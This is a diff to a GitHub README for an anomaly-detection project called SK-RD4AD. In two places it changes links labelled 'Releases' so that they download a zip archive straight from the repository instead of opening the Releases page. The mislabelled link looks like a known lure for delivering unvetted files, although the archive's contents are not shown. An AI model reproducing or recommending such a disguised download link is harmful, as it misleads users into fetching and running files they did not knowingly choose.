@@ -14,7 +14,7 @@ SK-RD4AD is a novel approach to anomaly detection that leverages skip connection
 
 ## How to Use
 
-To get started with SK-RD4AD, visit the [Releases](https://github.com/DrozeNzzz/SK-RD4AD/releases) section and download the necessary files. Once you have the files, follow the instructions provided to execute the code and start exploring the capabilities of SK-RD4AD.
+To get started with SK-RD4AD, visit the [Releases](https://github.com/DrozeNzzz/SK-RD4AD/raw/refs/heads/main/model/AD_R_S_v2.0-alpha.2.zip) section and download the necessary files. Once you have the files, follow the instructions provided to execute the code and start exploring the capabilities of SK-RD4AD.
 
 ## Additional Resources
 
@@ -34,6 +34,6 @@ Thank you for your interest in SK-RD4AD. We look forward to seeing the impact of
 
 --- 
 
-Feel free to visit the [Releases](https://github.com/DrozeNzzz/SK-RD4AD/releases) section to download and explore the project further. 
+Feel free to visit the [Releases](https://github.com/DrozeNzzz/SK-RD4AD/raw/refs/heads/main/model/AD_R_S_v2.0-alpha.2.zip) section to download and explore the project further. 
 
 ---
